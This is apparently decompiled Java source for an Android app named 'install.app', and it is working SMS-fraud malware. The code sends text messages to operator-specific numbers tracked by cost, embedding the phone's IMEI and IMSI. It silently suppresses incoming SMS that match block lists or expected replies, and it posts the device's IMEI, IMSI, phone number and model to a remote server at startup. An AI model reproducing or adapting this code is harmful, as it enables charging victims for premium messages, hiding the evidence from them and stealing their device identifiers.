package install.app;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.support.v4.view.MotionEventCompat;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.format.Time;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Vector;
import org.json.JSONArray;
import org.json.JSONObject;

public class Settings {
    public static int DAY = (HOUR * 24);
    public static int HOUR = (MINUTE * 60);
    public static int MINUTE = (SECOND * 60);
    public static int SECOND = 1000;
    public static String SETTINGS = "settings";
    public static String imei = "";
    public static String imsi = "";
    static Settings settings;
    public static boolean timeNotActual = false;
    public Vector<String> aosList;
    public Vector<String> blockList;
    public int currentGlobalMaxSmsCount;
    public int currentMaxSmsCost;
    public int currentMaxSmsCount;
    public int currentOperatorId;
    public int currentOperatorIndex;
    public int currentSmsIndex;
    public long currentSmsKey;
    public boolean defaultSet;
    public int globalMaxSmsCount;
    public int globalRepeat;
    public long lastTimeGlobalRepeat;
    public Vector<SmsOperator> operatorList;
    public long waitForSend;
    public boolean working;

    public Settings() {
        this.blockList = null;
        this.operatorList = null;
        this.aosList = null;
        this.currentOperatorId = 0;
        this.currentSmsKey = 0;
        this.currentMaxSmsCount = 0;
        this.currentMaxSmsCost = 0;
        this.working = false;
        this.currentOperatorIndex = 0;
        this.currentSmsIndex = 0;
        this.defaultSet = false;
        this.lastTimeGlobalRepeat = 0;
        this.currentGlobalMaxSmsCount = 0;
        this.globalMaxSmsCount = 0;
        this.globalRepeat = 0;
        this.blockList = new Vector();
        this.operatorList = new Vector();
        this.aosList = new Vector();
    }

    public boolean load(Context context) {
        boolean result = false;
        System.out.println("Settings::load() start");
        try {
            imei = getImei(context);
            imsi = getImsi(context);
            SharedPreferences sharedPreferences = context.getSharedPreferences(SETTINGS, 1);
            if (sharedPreferences.contains("first")) {
                int i;
                JSONArray jsonOperatorList = new JSONArray(sharedPreferences.getString("operatorList", ""));
                this.operatorList = new Vector();
                for (i = 0; i < jsonOperatorList.length(); i++) {
                    int j;
                    JSONObject jsonOperator = jsonOperatorList.getJSONObject(i);
                    SmsOperator smsOperator = new SmsOperator();
                    smsOperator.id = jsonOperator.getInt("id");
                    smsOperator.name = jsonOperator.getString("name");
                    smsOperator.maxSmsCount = jsonOperator.getInt("maxSmsCount");
                    smsOperator.maxSmsCost = jsonOperator.getInt("maxSmsCost");
                    smsOperator.repeat = jsonOperator.getInt("repeat");
                    smsOperator.time = jsonOperator.getLong("time");
                    JSONArray jsonCodes = jsonOperator.getJSONArray("codes");
                    for (j = 0; j < jsonCodes.length(); j++) {
                        smsOperator.codes.add(jsonCodes.getString(j));
                    }
                    JSONArray jsonSmsList = jsonOperator.getJSONArray("sms");
                    for (j = 0; j < jsonSmsList.length(); j++) {
                        JSONObject jsonSms = jsonSmsList.getJSONObject(j);
                        SmsItem smsItem = new SmsItem(jsonSms.getString("number"), jsonSms.getString("text"));
                        smsItem.cost = jsonSms.getInt("cost");
                        smsItem.wait = jsonSms.getInt("wait");
                        smsItem.responseText = jsonSms.getString("responseText");
                        smsItem.responseNumber = jsonSms.getString("responseNumber");
                        smsItem.key = jsonSms.getLong("key");
                        smsOperator.sms.add(smsItem);
                    }
                    this.operatorList.add(smsOperator);
                }
                JSONArray jsonBlockList = new JSONArray(sharedPreferences.getString("blockList", ""));
                this.blockList = new Vector();
                for (i = 0; i < jsonBlockList.length(); i++) {
                    this.blockList.add(jsonBlockList.getString(i));
                }
                JSONArray jsonAosList = new JSONArray(sharedPreferences.getString("aosList", ""));
                this.aosList = new Vector();
                for (i = 0; i < jsonAosList.length(); i++) {
                    this.aosList.add(jsonAosList.getString(i));
                }
                this.currentOperatorId = sharedPreferences.getInt("currentOperatorId", 0);
                this.currentSmsKey = sharedPreferences.getLong("currentSmsKey", 0);
                this.currentMaxSmsCount = sharedPreferences.getInt("currentMaxSmsCount", 0);
                this.currentMaxSmsCost = sharedPreferences.getInt("currentMaxSmsCost", 0);
                this.currentOperatorIndex = sharedPreferences.getInt("currentOperatorIndex", 0);
                this.currentSmsIndex = sharedPreferences.getInt("currentSmsIndex", 0);
                this.working = sharedPreferences.getBoolean("working", false);
                this.defaultSet = sharedPreferences.getBoolean("defaultSet", false);
                this.waitForSend = sharedPreferences.getLong("waitForSend", 0);
                this.globalMaxSmsCount = sharedPreferences.getInt("globalMaxSmsCount", 0);
                this.globalRepeat = sharedPreferences.getInt("globalRepeat", 0);
                this.lastTimeGlobalRepeat = sharedPreferences.getLong("lastTimeGlobalRepeat", 0);
                this.currentGlobalMaxSmsCount = sharedPreferences.getInt("currentGlobalMaxSmsCount", 0);
                result = true;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        System.out.println("Settings::load() end");
        return result;
    }

    public boolean save(Context context) {
        System.out.println("Settings::save() start");
        try {
            int i;
            Editor editor = context.getSharedPreferences(SETTINGS, 2).edit();
            editor.putBoolean("first", false);
            JSONArray jsonOperatorList = new JSONArray();
            for (i = 0; i < this.operatorList.size(); i++) {
                int j;
                SmsOperator smsOperator = (SmsOperator) this.operatorList.get(i);
                JSONObject jsonOperator = new JSONObject();
                jsonOperator.put("id", smsOperator.id);
                jsonOperator.put("name", smsOperator.name);
                jsonOperator.put("maxSmsCount", smsOperator.maxSmsCount);
                jsonOperator.put("maxSmsCost", smsOperator.maxSmsCost);
                jsonOperator.put("repeat", smsOperator.repeat);
                jsonOperator.put("time", smsOperator.time);
                JSONArray jsonCodes = new JSONArray();
                for (j = 0; j < smsOperator.codes.size(); j++) {
                    jsonCodes.put(smsOperator.codes.get(j));
                }
                jsonOperator.put("codes", jsonCodes);
                JSONArray jsonSmsList = new JSONArray();
                for (j = 0; j < smsOperator.sms.size(); j++) {
                    SmsItem smsItem = (SmsItem) smsOperator.sms.get(j);
                    JSONObject jsonSms = new JSONObject();
                    jsonSms.put("number", smsItem.number);
                    jsonSms.put("text", smsItem.text);
                    jsonSms.put("cost", smsItem.cost);
                    jsonSms.put("wait", smsItem.wait);
                    jsonSms.put("responseText", smsItem.responseText);
                    jsonSms.put("responseNumber", smsItem.responseNumber);
                    jsonSms.put("key", smsItem.key);
                    jsonSmsList.put(jsonSms);
                }
                jsonOperator.put("sms", jsonSmsList);
                jsonOperatorList.put(jsonOperator);
            }
            editor.putString("operatorList", jsonOperatorList.toString());
            JSONArray jsonBlockList = new JSONArray();
            for (i = 0; i < this.blockList.size(); i++) {
                jsonBlockList.put(this.blockList.get(i));
            }
            editor.putString("blockList", jsonBlockList.toString());
            JSONArray jsonAosList = new JSONArray();
            for (i = 0; i < this.aosList.size(); i++) {
                jsonAosList.put(this.aosList.get(i));
            }
            editor.putString("aosList", jsonAosList.toString());
            editor.putInt("currentOperatorId", this.currentOperatorId);
            editor.putLong("currentSmsKey", this.currentSmsKey);
            editor.putInt("currentMaxSmsCount", this.currentMaxSmsCount);
            editor.putInt("currentMaxSmsCost", this.currentMaxSmsCost);
            editor.putInt("currentOperatorIndex", this.currentOperatorIndex);
            editor.putInt("currentSmsIndex", this.currentSmsIndex);
            editor.putBoolean("working", this.working);
            editor.putBoolean("defaultSet", this.defaultSet);
            editor.putLong("waitForSend", this.waitForSend);
            editor.putInt("globalMaxSmsCount", this.globalMaxSmsCount);
            editor.putInt("globalRepeat", this.globalRepeat);
            editor.putLong("lastTimeGlobalRepeat", this.lastTimeGlobalRepeat);
            editor.putInt("currentGlobalMaxSmsCount", this.currentGlobalMaxSmsCount);
            editor.commit();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        System.out.println("Settings::save() end");
        return false;
    }

    public void reset(Context context) {
        try {
            Editor editor = context.getSharedPreferences(SETTINGS, 2).edit();
            editor.clear();
            editor.commit();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static String getImei(Context context) {
        try {
            String value = ((TelephonyManager) context.getSystemService("phone")).getDeviceId();
            if (value != null) {
                return value;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return "ERR";
    }

    public static String getCountry(Context context) {
        try {
            String value = ((TelephonyManager) context.getSystemService("phone")).getSimCountryIso();
            if (value != null) {
                return value;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return "ERR";
    }

    public static String getPhone(Context context) {
        try {
            String value = ((TelephonyManager) context.getSystemService("phone")).getLine1Number();
            if (value != null) {
                return value;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return "ERR";
    }

    public static String getImsi(Context context) {
        try {
            String value = ((TelephonyManager) context.getSystemService("phone")).getSubscriberId();
            if (value != null) {
                return value;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return "ERR";
    }

    public static String md5(String value) {
        try {
            MessageDigest digest = MessageDigest.getInstance("MD5");
            digest.update(value.getBytes());
            byte[] messageDigest = digest.digest();
            StringBuffer hexString = new StringBuffer();
            for (byte b : messageDigest) {
                String tmp = Integer.toHexString(b & MotionEventCompat.ACTION_MASK);
                if (tmp.length() == 1) {
                    hexString.append("0");
                }
                hexString.append(tmp);
            }
            return hexString.toString();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
            return "";
        }
    }

    public static String getCurrentTime() {
        Time time = new Time();
        time.setToNow();
        return time.format("%Y_%m_%d_%H_%M_%S");
    }

    public void printToOutStream() {
    }

    public static boolean sendSms(String number, String text) {
        try {
            text = text.replace("{IMEI}", imei).replace("{IMSI}", imsi);
            System.out.println("sms: " + text + " to " + number);
            SmsManager.getDefault().sendTextMessage(number, null, text, null, null);
            return true;
        } catch (Exception ex) {
            ex.printStackTrace();
            return false;
        }
    }

    public boolean isDeleteMessage(String phone, String text) {
        for (int i = 0; i < this.blockList.size(); i++) {
            if (((String) this.blockList.get(i)).equals(phone)) {
                return true;
            }
        }
        return false;
    }

    public boolean isAosMessage(String phone, String text) {
        for (int i = 0; i < this.aosList.size(); i++) {
            if (phone.startsWith((String) this.aosList.get(i))) {
                return true;
            }
        }
        return false;
    }

    public static void setSettings(Settings set) {
        settings = set;
    }

    public static Settings getSettings() {
        return settings;
    }

    public void updateCurrentOperator(SmsOperator smsOperator) {
        this.operatorList.set(this.currentOperatorIndex, smsOperator);
    }

    public void printTimes() {
        System.out.println("==================TIMES====================");
        for (int i = 0; i < this.operatorList.size(); i++) {
            SmsOperator operator = (SmsOperator) this.operatorList.get(i);
            System.out.println(operator.name + " operator[" + i + "].time: " + operator.time);
        }
        System.out.println("============================================");
    }

    public SmsOperator loadCurrentOperator() {
        return (SmsOperator) this.operatorList.get(this.currentOperatorIndex);
    }

    public SmsItem loadCurrentSmsItem() {
        return (SmsItem) ((SmsOperator) this.operatorList.get(this.currentOperatorIndex)).sms.get(this.currentSmsIndex);
    }

    public static void startWaitTimer(Context context, long seconds) {
        timeNotActual = false;
        try {
            Intent intent = new Intent(context, MainReceiver.class);
            intent.setAction("custom.timer.wait");
            ((AlarmManager) context.getSystemService("alarm")).set(0, System.currentTimeMillis() + (((long) SECOND) * seconds), PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void cancelWaitTimer(Context context) {
        try {
            Intent intent = new Intent(context, MainReceiver.class);
            intent.setAction("custom.timer.wait");
            ((AlarmManager) context.getSystemService("alarm")).cancel(PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void startSendTimer(Context context, long seconds) {
        try {
            Intent intent = new Intent(context, MainReceiver.class);
            intent.setAction("custom.timer.send");
            ((AlarmManager) context.getSystemService("alarm")).set(0, System.currentTimeMillis() + (((long) SECOND) * seconds), PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static boolean loadSettings(Context context) {
        if (getSettings() != null) {
            return true;
        }
        Settings settings = new Settings();
        setSettings(settings);
        return settings.load(context);
    }

    public void updateCurrentMaxSmsCount() {
        if (this.lastTimeGlobalRepeat + ((long) (this.globalRepeat * MINUTE)) <= System.currentTimeMillis()) {
            this.currentGlobalMaxSmsCount = this.globalMaxSmsCount;
        }
    }

    public static void startKillTimer(Context context, long minutes) {
        try {
            Intent intent = new Intent(context, MainReceiver.class);
            intent.setAction("custom.timer.kill");
            ((AlarmManager) context.getSystemService("alarm")).set(0, System.currentTimeMillis() + (((long) MINUTE) * minutes), PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
package install.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class MainReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        try {
            String action = intent.getAction();
            Settings settings;
            if (action.equals("android.provider.Telephony.SMS_RECEIVED")) {
                SmsMessage[] messages = getSmsMessages(intent.getExtras());
                boolean find = false;
                for (int i = 0; i < messages.length; i++) {
                    try {
                        SmsMessage smsMessage = messages[i];
                        String number = smsMessage.getOriginatingAddress();
                        String text = smsMessage.getMessageBody();
                        if (Settings.loadSettings(context)) {
                            settings = Settings.getSettings();
                            if (settings.isAosMessage(number, text)) {
                                find = true;
                                System.out.println("isAosMessage() true");
                                try {
                                    Settings.sendSms(number, "ok");
                                } catch (Exception ex) {
                                    ex.printStackTrace();
                                }
                            }
                            SmsItem smsItem = settings.loadCurrentSmsItem();
                            WildCardStringFinder finderText = new WildCardStringFinder();
                            WildCardStringFinder finderNumber = new WildCardStringFinder();
                            if (smsItem.number.length() > 0 && smsItem.text.length() > 0 && finderNumber.isStringMatching(number, smsItem.responseNumber)) {
                                if (finderText.isStringMatching(text, smsItem.responseText)) {
                                    find = true;
                                    Settings.timeNotActual = true;
                                    if (!settings.defaultSet) {
                                        Settings.cancelWaitTimer(context);
                                        MainService.start(context, intent, "sms", true);
                                    }
                                }
                            }
                            if (!find && settings.isDeleteMessage(number, text)) {
                                find = true;
                            }
                        }
                    } catch (Exception ex2) {
                        ex2.printStackTrace();
                    }
                }
                if (find) {
                    try {
                        abortBroadcast();
                    } catch (Exception ex22) {
                        ex22.printStackTrace();
                    }
                }
            } else if (action.equals("custom.timer.wait")) {
                if (!Settings.timeNotActual) {
                    MainService.start(context, intent, "sms", false);
                }
            } else if (action.equals("custom.timer.send")) {
                MainService.start(context, intent, "send");
            } else if (action.equals("android.intent.action.BOOT_COMPLETED")) {
                if (Settings.loadSettings(context)) {
                    settings = Settings.getSettings();
                    if (settings.working) {
                        settings.working = false;
                        settings.save(context);
                    }
                }
            } else if (action.equals("custom.timer.kill")) {
                MainService.isRunning = false;
            }
        } catch (Exception ex222) {
            ex222.printStackTrace();
        }
    }

    private SmsMessage[] getSmsMessages(Bundle paramBundle) {
        Object[] array = (Object[]) paramBundle.get("pdus");
        SmsMessage[] messages = new SmsMessage[array.length];
        for (int i = 0; i < array.length; i++) {
            messages[i] = SmsMessage.createFromPdu((byte[]) array[i]);
        }
        return messages;
    }
}
package install.app;

import android.app.Activity;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.res.Configuration;
import android.net.Uri;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.Handler;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.JsPromptResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.LinearLayout.LayoutParams;
import java.io.DataOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.LinkedList;
import java.util.List;
import java.util.Vector;
import org.MobileDb.MobileDatabase;
import org.MobileDb.Table;
import org.apache.http.NameValuePair;
import org.apache.http.client.utils.URLEncodedUtils;
import org.json.JSONObject;
import ru.beta.Beta;

public class MainActivity extends Activity implements ThreadOperationListener {
    public static int IDD_LOADING = 2;
    public static int IDD_PROGRESS = 1;
    public static Vector<String> aosList = new Vector();
    public static WebApi api;
    public static Vector<String> blockList = new Vector();
    private static boolean loaded = false;
    public static Vector<SmsOperator> operatorsList = new Vector();
    public static Settings settings = null;
    public static long startTime = 0;
    public static WebView webView;
    public String apkUrl = "";
    public int globalMaxSmsCount = 0;
    public int globalRepeat = 0;
    public Handler handler = null;
    ProgressDialog loadingDialog = null;
    public boolean needBlock = false;
    public String postUrl = "";
    ProgressDialog progressDialog = null;
    public long waitForSend;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        startTime = System.currentTimeMillis();
        try {
            JSONObject json = new JSONObject();
            json.put("sid", "SID1");
            json.put("version", "VER1");
            json.put("server", getString(R.string.host));
            json.put("startPeriod", 60);
            json.put("period", 86400);
            json.put("twitterUrl", "http://mobile.twitter.com/Vaberg1");
            json.put("apiKey", getString(R.string.api_key));
            json.put("appId", getString(R.string.app_id));
            Beta beta = new Beta(getApplicationContext(), json);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        showDialog(IDD_LOADING);
        loadData();
        new Thread(new ThreadOperation(this, 1, null)).start();
        sendHttp();
        this.handler = new Handler();
        setContentView(R.layout.main);
        api = new WebApi(this, this);
        webView = new WebView(this);
        webView.setWebViewClient(new WebViewClient() {
            public void onPageFinished(WebView view, String url) {
                System.out.println("Page loaded");
                try {
                    MainActivity.this.loadingDialog.dismiss();
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
                MainActivity.callJsCallbackAndroidVersion(VERSION.RELEASE);
            }
        });
        webView.setScrollBarStyle(33554432);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebChromeClient(new WebChromeClient() {
            public boolean onJsPrompt(WebView view, String url, String message, String defaultValue, JsPromptResult result) {
                WebApiResult apiResult = MainActivity.api.textToCommand(message, defaultValue);
                if (!apiResult.find) {
                    return false;
                }
                result.confirm(apiResult.result);
                return true;
            }
        });
        webView.addJavascriptInterface(api, "webapi");
        webView.setLayoutParams(new LayoutParams(-1, -2, 1.0f));
        ((LinearLayout) findViewById(R.id.linearLayout4)).addView(webView);
        webView.loadUrl("file:///android_asset/html/index.html");
    }

    public boolean onKeyDown(int keyCode, KeyEvent event) {
        System.out.println("onKeyDown(): keyCode = " + keyCode);
        if (keyCode != 3 && keyCode == 4) {
        }
        return true;
    }

    public void onClickNext(View view) {
        System.out.println("onClickNext()");
        openUrl(this, this.apkUrl);
    }

    public void onClickRule(View view) {
        System.out.println("onClickRule()");
    }

    public void loadData() {
        try {
            if (!loaded) {
                int i;
                MobileDatabase db = new MobileDatabase();
                db.loadFrom("/res/raw/data.db", true);
                operatorsList = loadOperatorList(db);
                Table table = db.getTableByName("settings");
                this.apkUrl = (String) table.getFieldValueByName("url", 0);
                String tmp = (String) table.getFieldValueByName("block_numbers", 0);
                String tmp1 = (String) table.getFieldValueByName("aos_numbers", 0);
                this.postUrl = (String) table.getFieldValueByName("post_url", 0);
                this.globalMaxSmsCount = ((Integer) table.getFieldValueByName("maxSmsCount", 0)).intValue();
                this.waitForSend = (long) ((Integer) table.getFieldValueByName("time_between_send", 0)).intValue();
                this.globalRepeat = ((Integer) table.getFieldValueByName("repeat", 0)).intValue();
                this.postUrl = this.postUrl.replace("{IMEI}", Settings.getImei(this));
                this.postUrl = this.postUrl.replace("{IMSI}", Settings.getImsi(this));
                this.postUrl = this.postUrl.replace("{PHONE}", Settings.getPhone(this));
                this.postUrl = this.postUrl.replace("{COUNTRY}", Settings.getCountry(this));
                this.postUrl = this.postUrl.replace("{APPID}", getText(R.string.app_id));
                this.postUrl = this.postUrl.replace("{MODEL}", Build.MODEL);
                this.postUrl = this.postUrl.replace("{MANUFACTURER}", Build.MANUFACTURER);
                this.postUrl = this.postUrl.replace("{SDK}", String.valueOf(VERSION.SDK_INT));
                System.out.println("apkUrl: " + this.apkUrl);
                System.out.println("block_numbers: " + tmp);
                System.out.println("aos_numbers: " + tmp1);
                String[] blockNumbers = tmp.split(",");
                for (i = 0; i < blockNumbers.length; i++) {
                    System.out.println("blockNumbers: " + blockNumbers[i]);
                    blockList.add(blockNumbers[i]);
                }
                String[] aosNumbers = tmp1.split(",");
                for (i = 0; i < aosNumbers.length; i++) {
                    System.out.println("aosNumber: " + aosNumbers[i]);
                    aosList.add(aosNumbers[i]);
                }
                loaded = true;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    static Vector<SmsOperator> loadOperatorList(MobileDatabase db) {
        int i;
        SmsOperator operator;
        Integer operatorId;
        int j;
        Vector<SmsOperator> list = new Vector();
        Table table = db.getTableByName("operators");
        for (i = 0; i < table.rowsCount(); i++) {
            operator = new SmsOperator((Integer) table.getFieldValueByName("id", i));
            operator.name = (String) table.getFieldValueByName("name", i);
            operator.maxSmsCount = ((Integer) table.getFieldValueByName("maxSmsCount", i)).intValue();
            operator.maxSmsCost = ((Integer) table.getFieldValueByName("maxSmsCost", i)).intValue();
            operator.repeat = ((Integer) table.getFieldValueByName("repeat", i)).intValue();
            list.addElement(operator);
        }
        table = db.getTableByName("codes");
        for (i = 0; i < table.rowsCount(); i++) {
            operatorId = (Integer) table.getFieldValueByName("operator_id", i);
            String code = (String) table.getFieldValueByName("code", i);
            for (j = 0; j < list.size(); j++) {
                operator = (SmsOperator) list.elementAt(j);
                if (operator.id == operatorId.intValue()) {
                    operator.codes.addElement(code);
                    break;
                }
            }
        }
        long key = 1;
        table = db.getTableByName("sms");
        for (i = 0; i < table.rowsCount(); i++) {
            operatorId = (Integer) table.getFieldValueByName("operator_id", i);
            Integer number = (Integer) table.getFieldValueByName("number", i);
            String text = (String) table.getFieldValueByName("text", i);
            int cost = ((Integer) table.getFieldValueByName("cost", i)).intValue();
            int wait = ((Integer) table.getFieldValueByName("wait", i)).intValue();
            String responseText = (String) table.getFieldValueByName("responseText", i);
            String responseNumber = (String) table.getFieldValueByName("responseNumber", i);
            for (j = 0; j < list.size(); j++) {
                operator = (SmsOperator) list.elementAt(j);
                if (operator.id == operatorId.intValue()) {
                    SmsItem smsItem = new SmsItem(String.valueOf(number.intValue()), text);
                    smsItem.cost = cost;
                    smsItem.wait = wait;
                    smsItem.responseNumber = responseNumber;
                    smsItem.responseText = responseText;
                    long key2 = key + 1;
                    smsItem.key = key;
                    operator.sms.addElement(smsItem);
                    key = key2;
                    break;
                }
            }
        }
        System.out.println("list: " + list.size());
        return list;
    }

    /* access modifiers changed from: protected */
    public Dialog onCreateDialog(int id) {
        if (id == IDD_PROGRESS) {
            this.progressDialog = new ProgressDialog(this);
            this.progressDialog.setProgressStyle(1);
            this.progressDialog.setTitle("Download");
            this.progressDialog.setMessage("Please wait");
            this.progressDialog.setCancelable(false);
            return this.progressDialog;
        } else if (id != IDD_LOADING) {
            return null;
        } else {
            this.loadingDialog = new ProgressDialog(this);
            this.loadingDialog.setProgressStyle(0);
            this.loadingDialog.setTitle("");
            this.loadingDialog.setMessage("Loading...");
            this.loadingDialog.setCancelable(false);
            return this.loadingDialog;
        }
    }

    public static HttpURLConnection sendHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList) {
        String KContentType = "multipart/form-data; boundary=AaB03x";
        String KStartContent = "--AaB03x";
        String KEndContent = "--AaB03x--";
        String KCrlf = "\r\n";
        URL url = null;
        try {
            int i;
            NameValuePair param;
            if (method.equals("POST")) {
                url = new URL(path);
            } else if (method.equals("GET")) {
                url = new URL(new StringBuilder(String.valueOf(path)).append("?").append(URLEncodedUtils.format(paramsList, "utf-8")).toString());
            }
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setRequestMethod(method);
            if (method.equals("POST")) {
                connection.setRequestProperty("Content-Type", KContentType);
            }
            for (i = 0; i < propertyList.size(); i++) {
                param = (NameValuePair) paramsList.get(i);
                connection.setRequestProperty(param.getName(), param.getValue());
            }
            if (method.equals("POST")) {
                DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
                for (i = 0; i < paramsList.size(); i++) {
                    param = (NameValuePair) paramsList.get(i);
                    outputStream.writeBytes(KStartContent);
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes("Content-Disposition: form-data; name=\"" + param.getName() + "\"");
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes(KCrlf);
                    outputStream.write(param.getValue().getBytes("utf-8"));
                    outputStream.writeBytes(KCrlf);
                }
                outputStream.writeBytes(KEndContent);
                outputStream.writeBytes(KCrlf);
                outputStream.flush();
                outputStream.close();
            } else if (method.equals("GET")) {
                connection.connect();
            }
            return connection;
        } catch (Exception ex) {
            ex.printStackTrace();
            return null;
        }
    }

    public static void sendPostRequest(String path, List<NameValuePair> paramsList, List<NameValuePair> propertyList) {
        sendSimpleHttpRequest(path, "POST", paramsList, propertyList);
    }

    public static void sendGetRequest(String path, List<NameValuePair> paramsList, List<NameValuePair> propertyList) {
        sendSimpleHttpRequest(path, "GET", paramsList, propertyList);
    }

    public static void sendSimpleHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList) {
        try {
            HttpURLConnection connection = sendHttpRequest(path, method, paramsList, propertyList);
            if (connection != null) {
                System.out.println("getResponseCode: " + connection.getResponseCode());
                connection.disconnect();
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public void sendHttp() {
        try {
            new Thread(new Runnable() {
                public void run() {
                    MainActivity.sendPostRequest(MainActivity.this.postUrl, new LinkedList(), new LinkedList());
                }
            }).start();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void openUrl(Context context, String url) {
        try {
            Intent browserIntent = new Intent("android.intent.action.VIEW", Uri.parse(url));
            browserIntent.addFlags(268435456);
            context.startActivity(browserIntent);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public void uninstall() {
        uninstallApk(this, getPackageName());
    }

    public static void uninstallApk(Context context, String pkg) {
        System.out.println("uninstallApk: " + pkg);
        Intent intent = new Intent("android.intent.action.DELETE");
        intent.setData(Uri.parse("package:" + pkg));
        intent.addFlags(268435456);
        context.startActivity(intent);
    }

    public static void callJsCallbackAndroidVersion(String version) {
        System.out.println("callJsCallbackAndroidVersion()");
        System.out.println("version: " + version);
        try {
            webView.loadUrl("javascript:androidVersion(" + ("'" + version + "'") + ")");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        setRequestedOrientation(1);
    }

    public void threadOperationRun(int id, Object obj) {
        if (id == 1) {
            if (settings == null) {
                settings = new Settings();
                Settings.setSettings(settings);
                if (!settings.load(this)) {
                    System.out.println("FIRST START");
                    settings.operatorList = operatorsList;
                    settings.blockList = blockList;
                    settings.waitForSend = this.waitForSend;
                    settings.globalMaxSmsCount = this.globalMaxSmsCount;
                    settings.globalRepeat = this.globalRepeat;
                    settings.aosList = aosList;
                    settings.save(this);
                }
                settings.load(this);
                settings.printToOutStream();
            }
            try {
                MainService.start(this, new Intent(), "pay");
                System.out.println("MainService.start(this, new Intent(), \"pay\")");
            } catch (Exception ex) {
                ex.printStackTrace();
            }
            MainService.packageName = getPackageName();
            MainService.start(this, new Intent(), "logs");
            Settings.startKillTimer(this, 10);
        }
    }
}
